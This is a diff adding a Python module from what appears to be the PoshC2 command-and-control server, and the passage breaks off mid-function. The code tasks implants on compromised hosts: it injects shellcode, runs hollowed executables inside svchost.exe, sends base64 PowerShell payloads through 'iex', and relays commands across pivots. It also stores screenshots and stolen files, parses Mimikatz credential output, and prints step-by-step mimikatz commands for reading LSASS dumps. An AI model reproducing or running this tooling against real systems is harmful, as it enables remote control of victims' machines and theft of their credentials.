@@ -1,0 +1,704 @@
+import hashlib, base64, traceback, os, re
+from datetime import datetime, timezone
+
+import poshc2.server.database.DB as DB
+from poshc2.Colours import Colours
+from poshc2.server.Config import ModulesDirectory, DownloadsDirectory, ReportsDirectory
+from poshc2.server.Implant import Implant
+from poshc2.server.Core import decrypt, decrypt_bytes, decrypt_bytes_gzip, process_mimikatz, print_bad
+from poshc2.server.Core import load_module, load_module_sharp, load_module_native, encrypt, default_response
+from poshc2.server.PowerStatus import translate_power_status
+from poshc2.Utils import randomuri
+
+
+def save_and_print_output(output, module_name, hostname):
+    try:
+        now = datetime.now(timezone.utc)
+        filename = f"{module_name}_{hostname}_{now.strftime('%Y%m%d%H%M%S')}"
+        output_file = open(f'{DownloadsDirectory}{filename}.txt', 'w')
+        output_file.write(output)
+        output_file.close()
+        print(output)
+        print(f"{module_name} output saved to: {DownloadsDirectory}{filename}.txt")
+    except Exception as e:
+        print(e)
+
+
+def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
+    now = datetime.now(timezone.utc)
+    all_implants = DB.get_implants_all()
+    if not all_implants:
+        print_bad("Received post request but no implants in database... has the project been cleaned but you're using the same URLs?")
+        return
+    for implant in all_implants:
+        implantID = implant.ImplantID
+        RandomURI = implant.RandomURI
+        Hostname = implant.Hostname
+        encKey = implant.Key
+        Domain = implant.Domain
+        User = implant.User
+        implant_type = implant.Pivot
+        if RandomURI in uriPath and cookieVal:
+            now = datetime.now(timezone.utc)
+            DB.update_implant_lastseen(now.strftime("%Y-%m-%d %H:%M:%S"), RandomURI)
+            decCookie = decrypt(encKey, cookieVal)
+            if implant_type == "JXA":
+                rawoutput = decrypt(encKey, post_data[1500:])
+            else:
+                rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+
+            if decCookie.startswith("Error"):
+                print(Colours.RED)
+                print("The multicmd errored: ")
+                print(rawoutput)
+                print(Colours.GREEN)
+                return
+
+            cookieMsg = ""
+            if "-" in decCookie:
+                decCookie = decCookie.strip('\x00')
+                splt = decCookie.split("-")
+                if not splt[0].isdigit():
+                    print(Colours.RED + "[!] Cookie %s is invalid" % decCookie + Colours.GREEN)
+                    return
+                else:
+                    taskId = str(int(splt[0]))
+                    cookieMsg = splt[1]
+            else:
+                taskId = str(int(decCookie.strip('\x00')))
+            taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
+            if taskId != "99999":
+                executedCmd = DB.get_cmd_from_task_id(taskId)
+                task_owner = DB.get_task_owner(taskId)
+            else:
+                print(Colours.END)
+                now = datetime.now(timezone.utc)
+                now_string = now.strftime("%Y-%m-%d %H:%M:%S")
+                print(
+                    f"Background task against implant {implantID} on host {Domain}\\{User} @ {Hostname} ({now_string}) (output appended to %sbackground-data.txt)" % ReportsDirectory)
+                print(Colours.GREEN)
+                print(rawoutput)
+                miscData = open(("%sbackground-data.txt" % ReportsDirectory), "a+")
+                miscData.write(rawoutput)
+                return
+            print(Colours.GREEN)
+            now = datetime.now(timezone.utc)
+            if task_owner is not None:
+                print("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (
+                    taskIdStr, task_owner, implantID, Domain, User, Hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
+            else:
+                print("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
+            try:
+                if isinstance(rawoutput, bytes):
+                    outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput.decode('us-ascii', errors="ignore"))
+                else:
+                    outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
+                outputParsed = outputParsed.rstrip().replace("\x00", "")
+            except Exception as e:
+                print("Error parsing output from implant: %s" % e)
+                outputParsed = ""
+                pass
+            if cookieMsg is not None and cookieMsg.lower().startswith("pwrstatusmsg"):
+                translate_power_status(outputParsed, RandomURI)
+                return
+            if "loadmodule" in executedCmd and len(outputParsed.split()) == 0:
+                print("Module loaded successfully")
+                DB.update_task(taskId, "Module loaded successfully")
+            elif "pbind-connect " in executedCmd and "PBind-Connected" in outputParsed or "PBind PBind start" in executedCmd and "PBind-Connected" in outputParsed:
+                try:
+                    outputParsed = re.search("PBind-Connected:.*", outputParsed)
+                    outputParsed = outputParsed[0].replace("PBind-Connected: ", "")
+                    Domain, User, Hostname, Arch, PID, ProcName = str(outputParsed).split(";")
+                    if "\\" in User:
+                        User = User[User.index("\\") + 1:]
+
+                    PivotString = "C# PBind"
+                    if "pbind-command run-exe PBind PBind start" in executedCmd:
+                        PivotString = "C# PBind Pivot"
+
+                    newImplant = Implant(implantID, PivotString, str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName), None)
+                    newImplant.save()
+                    newImplant.display()
+                    newImplant.autoruns()
+                    if "pbind-command run-exe PBind PBind start" in executedCmd:
+                        DB.new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+                    else:
+                        DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+                except Exception as e:
+                    print(e)
+            elif executedCmd.lower().startswith("run-exe seatbelt"):
+                save_and_print_output(rawoutput, "Seatbelt", implant.Hostname)
+            elif "fcomm-connect " in executedCmd and "FComm-Connected" in outputParsed:
+                outputParsed = re.search("FComm-Connected:.*", outputParsed)
+                outputParsed = outputParsed[0].replace("FComm-Connected: ", "")
+                Domain, User, Hostname, Arch, PID, ProcName = str(outputParsed).split(";")
+                if "\\" in User:
+                    User = User[User.index("\\") + 1:]
+                newImplant = Implant(implantID, "C# FComm", str(Domain), str(User), str(Hostname), Arch, PID, str(ProcName), None)
+                newImplant.save()
+                newImplant.display()
+                newImplant.autoruns()
+                DB.new_task("fcomm-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
+            elif executedCmd.lower().startswith("beacon "):
+                new_sleep = executedCmd.replace('beacon ', '').strip()
+                DB.update_sleep(new_sleep, RandomURI)
+            elif "get-screenshot" in executedCmd.lower():
+                try:
+                    decoded = base64.b64decode(outputParsed)
+                    now = datetime.now(timezone.utc)
+                    filename = implant.User + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
+                    output_file = open('%s%s.png' % (DownloadsDirectory, filename), 'wb')
+                    print("Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
+                    DB.update_task(taskId, "Screenshot captured: %s%s.png" % (DownloadsDirectory, filename))
+                    output_file.write(decoded)
+                    output_file.close()
+                except Exception:
+                    DB.update_task(taskId, "Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
+                    print("Screenshot not captured, the screen could be locked or this user does not have access to the screen!")
+            elif (executedCmd.lower().startswith("$shellcode64")) or (executedCmd.lower().startswith("$shellcode64")):
+                DB.update_task(taskId, "Upload shellcode complete")
+                print("Upload shellcode complete")
+            elif (executedCmd.lower().startswith("run-exe core.program core inject-shellcode")) or (
+                    executedCmd.lower().startswith("pbind-command run-exe core.program core inject-shellcode")) or (
+                    executedCmd.lower().startswith("pbind-pivot-command run-exe core.program core inject-shellcode")):
+                DB.update_task(taskId, "Upload shellcode complete")
+                print(outputParsed)
+            elif "memoryonlyjson" in executedCmd.lower() or "memoryonlyzip" in executedCmd.lower():
+                try:
+                    if "Initializing SharpHound" in rawoutput:
+                        DB.update_task(taskId, rawoutput)
+                        print(rawoutput)
+                    else:
+                        print("Downloading bloodhound")
+                        print(rawoutput)
+                except TypeError as e:
+                    try:
+                        now = datetime.now(timezone.utc)
+                        filename = "bloodhound-" + now.strftime("%m%d%Y%H%M%S_" + randomuri()) + ".bin"
+                        print("Downloaded file %s " % filename)
+                        output_file = open('%s%s' % (DownloadsDirectory, filename), 'ab')
+                        try:
+                            output_file.write(rawoutput)
+                        except Exception:
+                            output_file.write(rawoutput.encode("utf-8"))
+                        output_file.close()
+                    except ValueError:
+                        print(f"Error downloading bloodhound file {e} \n{rawoutput}")
+                    except Exception as e:
+                        print("Error downloading bloodhound file %s " % e)
+                        traceback.print_exc()
+                except Exception as e:
+                    print("Error with bloodhound %s " % e)
+                    traceback.print_exc()
+            elif "download-file" in executedCmd.lower():
+                try:
+                    filename = executedCmd.lower().replace("download-files ", "")
+                    filename = filename.replace("download-file ", "")
+                    filename = filename.replace("-source ", "")
+                    filename = filename.replace("..", "")
+                    filename = filename.replace("'", "")
+                    filename = filename.replace('"', "")
+                    filename = filename.replace("\\", "/")
+                    directory, filename = filename.rsplit('/', 1)
+                    filename = filename.rstrip('\x00')
+                    original_filename = filename.strip()
+
+                    if not original_filename:
+                        directory = directory.rstrip('\x00')
+                        directory = directory.replace("/", "_").replace("\\", "_").strip()
+                        original_filename = directory
+
+                    try:
+                        if rawoutput.startswith("Error"):
+                            print("Error downloading file: ")
+                            print(rawoutput)
+                            break
+                        chunkNumber = rawoutput[:5]
+                        totalChunks = rawoutput[5:10]
+                    except Exception:
+                        chunkNumber = rawoutput[:5].decode("utf-8")
+                        totalChunks = rawoutput[5:10].decode("utf-8")
+
+                    if (chunkNumber == "00001") and os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
+                        counter = 1
+                        while (os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter)
+                            counter += 1
+                    if (chunkNumber != "00001"):
+                        counter = 1
+                        if not os.path.isfile('%s%s' % (DownloadsDirectory, filename)):
+                            print(f"Error trying to download part of a file to a file that does not exist: {filename} \n{rawoutput}")
+                        while (os.path.isfile('%s%s' % (DownloadsDirectory, filename))):
+                            # First find the 'next' file would be downloaded to
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter)
+                            counter += 1
+                        if counter != 2:
+                            # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
+                            if '.' in filename:
+                                filename = original_filename[:original_filename.rfind('.')] + '-' + str(counter - 2) + original_filename[original_filename.rfind('.'):]
+                            else:
+                                filename = original_filename + '-' + str(counter - 2)
+                        else:
+                            filename = original_filename
+
+                    val = int(chunkNumber)  # hit exception ValueError
+                    print("Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                    DB.update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber, totalChunks, filename))
+                    output_file = open('%s%s' % (DownloadsDirectory, filename), 'ab')
+                    try:
+                        output_file.write(rawoutput[10:])
+                    except Exception:
+                        output_file.write(rawoutput[10:].encode("utf-8"))
+                    output_file.close()
+                except ValueError:
+                    DB.update_task(taskId, f"Error downloading file {e} \n{rawoutput}")
+                    print(f"Error downloading file {e} \n{rawoutput}")
+                except Exception as e:
+                    DB.update_task(taskId, "Error downloading file %s " % e)
+                    print("Error downloading file %s " % e)
+                    traceback.print_exc()
+
+            elif "safetydump" in executedCmd.lower():
+                rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
+                if rawoutput.startswith("[-]") or rawoutput.startswith("ErrorCmd"):
+                    DB.update_task(taskId, rawoutput)
+                    print(rawoutput)
+                else:
+                    dumpname = "SafetyDump-Task-%s.b64" % taskIdStr
+                    dumppath = "%s%s" % (DownloadsDirectory, dumpname)
+                    open(dumppath, 'w').write(rawoutput)
+                    message = "Dump written to: %s" % dumppath
+                    message = message + "\n The base64 blob needs decoding, e.g. on Windows to use Mimikatz:"
+                    message = message + "\n     $filename = '.\\%s'" % dumpname
+                    message = message + "\n     $b64 = Get-Content $filename"
+                    message = message + "\n     $bytes = [System.Convert]::FromBase64String($b64)"
+                    message = message + "\n     [io.file]::WriteAllBytes(((Get-Item -Path \".\\\").FullName) + '\\safetydump.dmp', $bytes)"
+                    message = message + "\n     ./mimikatz.exe"
+                    message = message + "\n     sekurlsa::minidump safetydump.dmp"
+                    message = message + "\n     sekurlsa::logonpasswords"
+                    message = message + "\nOr to just decode on Linux:"
+                    message = message + f"\n     base64 -id {dumpname} > dump.bin"
+                    DB.update_task(taskId, message)
+                    print(message)
+
+            elif (executedCmd.lower().startswith("run-exe safetykatz") or "invoke-mimikatz" in executedCmd or executedCmd.lower().startswith(
+                    "pbind-") or executedCmd.lower().startswith("fcomm-command") or executedCmd.lower().startswith(
+                "run-dll sharpsploit")) and "logonpasswords" in outputParsed.lower():
+                print("Parsing Mimikatz Output")
+                DB.update_task(taskId, outputParsed)
+                process_mimikatz(outputParsed)
+                print(Colours.GREEN)
+                print(outputParsed + Colours.END)
+
+            elif "| poshgrep" in executedCmd.lower():
+                DB.update_task(taskId, outputParsed)
+                print(Colours.GREEN)
+                params = re.compile(r'(?<=poshgrep)\s(.*)')
+                params = params.findall(executedCmd)
+                if params:
+                    print(f"[+] Grepping output for {params[0]}: \n")
+                else:
+                    print(outputParsed)
+                for line in outputParsed.splitlines():
+                    if params[0].lower() in line.lower():
+                        print(line)
+                print(Colours.END)
+
+            else:
+                DB.update_task(taskId, outputParsed)
+                print(Colours.GREEN)
+                print(outputParsed + Colours.END)
+
+
+def newTask(path):
+    all_implants = DB.get_implants_all()
+    commands = ""
+    if all_implants:
+        for i in all_implants:
+            RandomURI = i.RandomURI
+            Pivot = i.Pivot
+            EncKey = i.Key
+            tasks = DB.get_newtasks(RandomURI)
+            if RandomURI in path and tasks:
+                for task in tasks:
+                    command = task[2]
+                    user = task[3]
+                    user_command = command
+                    implant = DB.get_implantbyrandomuri(RandomURI)
+                    implant_type = DB.get_implanttype(RandomURI)
+                    now = datetime.now()
+                    if (command.lower().startswith("inject-shellcode")) or (command.lower().startswith("$shellcode64")) or (
+                            command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith(
+                        "run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith(
+                        "pbind-command run-exe core.program core inject-shellcode") or command.lower().startswith(
+                        "pbind-pivot-command run-exe core.program core inject-shellcode")):
+                        if " -Shellcode" in command:
+                            command = command
+                        else:
+                            user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
+                            command = command[:command.index("#")]
+                    elif (command.lower().startswith("run-jxa ")) or (implant_type.lower().startswith('jxa') and command.lower().startswith("cred-popper ")):
+                        user_command = command[:command.index("#")]
+                        command = "run-jxa " + command[command.index("#") + 1:]
+                    elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file') or command.lower().startswith(
+                            'fcomm-command upload-file')):
+                        PBind = False
+                        FComm = False
+                        if command.lower().startswith('pbind-command upload-file'):
+                            PBind = True
+                        if command.lower().startswith('fcomm-command upload-file'):
+                            FComm = True
+                        upload_args = command \
+                            .replace('pbind-command upload-file', '') \
+                            .replace('fcomm-command upload-file', '') \
+                            .replace('upload-file', '')
+                        upload_file_args_split = upload_args.split()
+                        if len(upload_file_args_split) < 2:
+                            print(Colours.RED)
+                            print("Error parsing upload command: %s" % upload_args)
+                            print(Colours.GREEN)
+                            continue
+                        upload_file = upload_file_args_split[0]
+                        upload_file_destination = upload_file_args_split[1]
+                        upload_args = upload_args.replace(upload_file, '')
+                        upload_args = upload_args.replace(upload_file_destination, '')
+                        with open(upload_file, "rb") as f:
+                            upload_file_bytes = f.read()
+                        if not upload_file_bytes:
+                            print(Colours.RED + f"Error, no bytes read from the upload file, removing task: {upload_file}" + Colours.GREEN)
+                            DB.del_newtasks(str(task[0]))
+                            continue
+                        upload_file_bytes_b64 = base64.b64encode(upload_file_bytes).decode("utf-8")
+                        if implant_type.lower().startswith('c#'):
+                            command = f"upload-file {upload_file_bytes_b64};\"{upload_file_destination}\" {upload_args}"
+                        elif implant_type.lower().startswith('ps'):
+                            command = f"Upload-File -Destination \"{upload_file_destination}\" -Base64 {upload_file_bytes_b64} {upload_args}"
+                        elif implant_type.lower().startswith('py'):
+                            command = f"upload-file \"{upload_file_destination}\":{upload_file_bytes_b64} {upload_args}"
+                        elif implant_type.lower().startswith('nativelinux'):
+                            command = f"upload-file:{upload_file_destination}:{upload_file_bytes_b64} {upload_args}"
+                        elif implant_type.lower().startswith('jxa'):
+                            command = f"upload-file {upload_file_destination}:{upload_file_bytes_b64} {upload_args}"
+                        else:
+                            print(Colours.RED)
+                            print("Error parsing upload command: %s" % upload_args)
+                            print(Colours.GREEN)
+                        if PBind:
+                            command = f"pbind-command {command}"
+                        if FComm:
+                            command = f"fcomm-command {command}"
+                        md5_filehash = hashlib.md5(base64.b64decode(upload_file_bytes_b64)).hexdigest()
+                        aes256_filehash = hashlib.sha256(base64.b64decode(upload_file_bytes_b64)).hexdigest()
+                        user_command = f"Uploading file: {upload_file} to {upload_file_destination} with md5sum: {md5_filehash} aes265: {aes256_filehash}"
+                    taskId = DB.insert_task(RandomURI, user_command, user)
+                    taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
+                    if len(str(taskId)) > 5:
+                        raise ValueError('Task ID is greater than 5 characters which is not supported.')
+                    print(Colours.YELLOW)
+                    now = datetime.now(timezone.utc)
+                    if user is not None and user != "":
+                        print("Task %s (%s) issued against implant %s on host %s\\%s @ %s (%s)" % (
+                            taskIdStr, user, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
+                    else:
+                        print("Task %s issued against implant %s on host %s\\%s @ %s (%s)" % (
+                            taskIdStr, implant.ImplantID, implant.Domain, implant.User, implant.Hostname, now.strftime("%Y-%m-%d %H:%M:%S")))
+                    try:
+                        if (user_command.lower().startswith("run-exe sharpwmi.program sharpwmi action=execute") or user_command.lower().startswith(
+                                "pbind-command run-exe sharpwmi.program sharpwmi action=execute") or user_command.lower().startswith(
+                            "fcomm-command run-exe sharpwmi.program sharpwmi action=execute")):
+                            print(user_command[0:200])
+                            print("----TRUNCATED----")
+                        else:
+                            print(user_command)
+                        print(Colours.END)
+                    except Exception as e:
+                        print("Cannot print output: %s" % e)
+                    if task[2].startswith("loadmodule "):
+                        try:
+                            module_name = (task[2]).replace("loadmodule ", "")
+                            if ".exe" in module_name or ".dll" in module_name:
+                                base64_module = load_module_sharp(module_name)
+                            else:
+                                base64_module = load_module(module_name)
+                            command = f"loadmodule{base64_module}"
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            command = "echo Module not found"
+                    elif task[2].startswith("run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("run-exe Program PS ", "")
+                            base64_module = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe Program PS %s" % base64_module
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-pivot-command run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("pbind-pivot-command run-exe Program PS ", "")
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            base64_module = base64.b64encode(f"run-exe Program PS {base64string}".encode("utf-8")).decode("utf-8")
+                            doubleBase64string = base64.b64encode(f"run-exe PBind PBind {base64_module}".encode("utf-8")).decode("utf-8")
+                            command = f"run-exe PBind PBind {doubleBase64string}"
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("run-exe RunPE.Program RunPE"):
+                        try:
+                            module_name = (task[2]).split()[3]
+                            module_args = (task[2]).split(".exe")[1]
+                            if module_args:
+                                b64args = base64.b64encode(f"{module_args}".encode("utf-8")).decode("utf-8")
+                                module_args = f"---a {b64args}"
+                            if ".exe" in module_name:
+                                base64_module = load_module_native(module_name, "PEs/")
+                            command = (task[2]).replace(module_name, f"---b {base64_module} {module_args}")
+                            command = f"{command} ---f c:\\windows\\system32\\svchost.exe"
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            command = "echo Module not found"
+                    elif task[2].startswith("pbind-command run-exe RunPE.Program RunPE"):
+                        try:
+                            module_name = (task[2]).split()[4]
+                            module_args = (task[2]).split(".exe")[1]
+                            if module_args:
+                                b64args = base64.b64encode(f"{module_args}".encode("utf-8")).decode("utf-8")
+                                module_args = f"---a {b64args}"
+                            if ".exe" in module_name:
+                                base64_module = load_module_native(module_name, "PEs/")
+                            command = (task[2]).replace(module_name, f"---b {base64_module} {module_args}").replace("pbind-command ", "")
+                            command = f"{command} ---f c:\\windows\\system32\\svchost.exe"
+                            base64string = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64string
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            command = "echo Module not found"
+                    elif task[2].startswith("run-exe RunOF.Program RunOF"):
+                        try:
+                            module_name = (task[2]).split()[3]
+                            if ".o" in module_name:
+                                base64_module = "-a " + load_module_native(module_name, "OFs/")
+                            command = (task[2]).replace(module_name, base64_module)
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            command = "echo Module not found"
+                    elif task[2].startswith("pbind-command run-exe RunOF.Program RunOF"):
+                        try:
+                            module_name = (task[2]).split()[4]
+                            if ".o" in module_name:
+                                base64_module = "-a " + load_module_native(module_name, "OFs/")
+                            command = (task[2]).replace(module_name, base64_module).replace("pbind-command ", "")
+                            base64string = base64.b64encode(command.encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64string
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            command = "echo Module not found"
+                    elif task[2].startswith("pbind-command run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            base64_module = base64.b64encode(f"run-exe Program PS {base64string}".encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64_module
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("fcomm-command run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("fcomm-command run-exe Program PS ", "")
+                            base64_module = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe FComm.FCClass FComm run-exe Program PS %s" % base64_module
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("fcomm-command run-exe Program PS "):
+                        try:
+                            cmd = (task[2]).replace("fcomm-command run-exe Program PS ", "")
+                            base64_module = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe FComm.FCClass FComm run-exe Program PS %s" % base64_module
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pslo "):
+                        try:
+                            module_name = (task[2]).replace("pslo ", "")
+                            for modname in os.listdir(ModulesDirectory):
+                                if modname.lower() in module_name.lower():
+                                    module_name = modname
+                            base64_module = load_module_sharp(module_name)
+                            command = "run-exe Program PS loadmodule%s" % base64_module
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-pslo"):
+                        try:
+                            module_name = (task[2]).replace("pbind-pslo ", "")
+                            for modname in os.listdir(ModulesDirectory):
+                                if modname.lower() in module_name.lower():
+                                    module_name = modname
+                            base64_module = load_module_sharp(module_name)
+                            cmd = "run-exe Program PS loadmodule%s" % base64_module
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64string
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-pivot-loadmodule "):
+                        try:
+                            module_name = (task[2]).replace("pbind-pivot-loadmodule ", "")
+                            if ".exe" in module_name or ".dll" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module_sharp(module_name)
+                                base64string = base64.b64encode(f"run-exe PBind PBind \"loadmodule{base64_module}\"".encode("utf-8")).decode("utf-8")
+                                command = f"run-exe PBind PBind {base64string}"
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("fcomm-pslo"):
+                        try:
+                            module_name = (task[2]).replace("fcomm-pslo ", "")
+                            for modname in os.listdir(ModulesDirectory):
+                                if modname.lower() in module_name.lower():
+                                    module_name = modname
+                            base64_module = load_module_sharp(module_name)
+                            command = "run-exe FComm.FCClass FComm \"run-exe Program PS loadmodule%s\"" % base64_module
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-loadmodule "):
+                        try:
+                            module_name = (task[2]).replace("pbind-loadmodule ", "")
+                            if ".exe" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module_sharp(module_name)
+                                command = "run-exe PBind PBind \"loadmodule%s\"" % base64_module
+                            elif ".dll" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module_sharp(module_name)
+                                command = "run-exe PBind PBind \"loadmodule%s\"" % base64_module
+                            else:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module(module_name)
+                                command = "run-exe PBind PBind \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(
+                                    bytes(base64_module, "utf-8")).decode('utf-8')
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-command "):
+                        try:
+                            cmd = command.replace("pbind-command ", "")
+                            base64string = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64string
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-connect"):
+                        command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
+                    elif task[2].startswith("pbind-kill"):
+                        command = command.replace("pbind-kill", "run-exe PBind PBind kill-implant")
+                    elif task[2].startswith("fcomm-loadmodule "):
+                        try:
+                            module_name = (task[2]).replace("fcomm-loadmodule ", "")
+                            if ".exe" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module_sharp(module_name)
+                                command = "run-exe FComm.FCClass FComm \"loadmodule%s\"" % base64_module
+                            elif ".dll" in module_name:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module_sharp(module_name)
+                                command = "run-exe FComm.FCClass FComm \"loadmodule%s\"" % base64_module
+                            else:
+                                for modname in os.listdir(ModulesDirectory):
+                                    if modname.lower() in module_name.lower():
+                                        module_name = modname
+                                base64_module = load_module(module_name)
+                                command = "run-exe FComm.FCClass FComm \"`$mk = '%s';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$mk))|iex\"" % base64.b64encode(
+                                    bytes(base64_module, "utf-8")).decode('utf-8')
+                        except Exception as e:
+                            print("Cannot find module, loadmodule is case sensitive!")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("fcomm-command "):
+                        command = command.replace("fcomm-command ", "run-exe FComm.FCClass FComm ")
+                    elif task[2].startswith("fcomm-connect"):
+                        command = command.replace("fcomm-connect ", "run-exe FComm.FCClass FComm start ")
+                    elif task[2].startswith("fcomm-kill"):
+                        command = command.replace("fcomm-kill", "run-exe FComm.FCClass FComm kill-implant")
+
+                    elif task[2].startswith("pbind-pivot-command "):
+                        try:
+                            cmd = command.replace("pbind-pivot-command ", "")
+                            base64string1 = base64.b64encode(cmd.encode("utf-8")).decode("utf-8")
+                            base64string = base64.b64encode(f"run-exe PBind PBind {base64string1}".encode("utf-8")).decode("utf-8")
+                            command = "run-exe PBind PBind %s" % base64string
+                        except Exception as e:
+                            print("Cannot base64 the command for PS")
+                            print(e)
+                            traceback.print_exc()
+                    elif task[2].startswith("pbind-pivot-connect"):
+                        command = command.replace("pbind-pivot-connect ", "run-exe PBind PBind run-exe PBind PBind start ")
+                    elif task[2].startswith("pbind-pivot-kill"):
+                        command = command.replace("pbind-pivot-kill", "run-exe PBind PBind run-exe PBind PBind kill-implant")
+                    elif "poshgrep" in task[2]:
+                        params = re.compile("\\|poshgrep(.*)", re.IGNORECASE)
+                        command = params.sub("", command)
+                        params = re.compile("\\| poshgrep(.*)", re.IGNORECASE)
+                        command = params.sub("", command)
+                    # Uncomment to print actual commands that are being sent
+                    # if "AAAAAAAAAAAAAAAAAAAA" not in command:
+                    #    print(Colours.BLUE + "Issuing Command: " + command + Colours.GREEN)
+
+                    command = taskIdStr + command
+                    if commands:
+                        commands += "!d-3dion@LD!-d" + command
+                    else:
+                        commands += command
+                    DB.del_newtasks(str(task[0]))
+                multicmd = ""
+                if commands is not None:
+                    multicmd = "multicmd%s" % commands
+                try:
+                    responseVal = encrypt(EncKey, multicmd)
+                except Exception as e:
+                    responseVal = ""
+                    print("Error encrypting value: %s" % e)
+                now = datetime.now(timezone.utc)
+                DB.update_implant_lastseen(now.strftime("%Y-%m-%d %H:%M:%S"), RandomURI)
+                return responseVal
+            elif RandomURI in path and not tasks:
+                # if there is no tasks but it's a normal beacon send 200
+                now = datetime.now(timezone.utc)
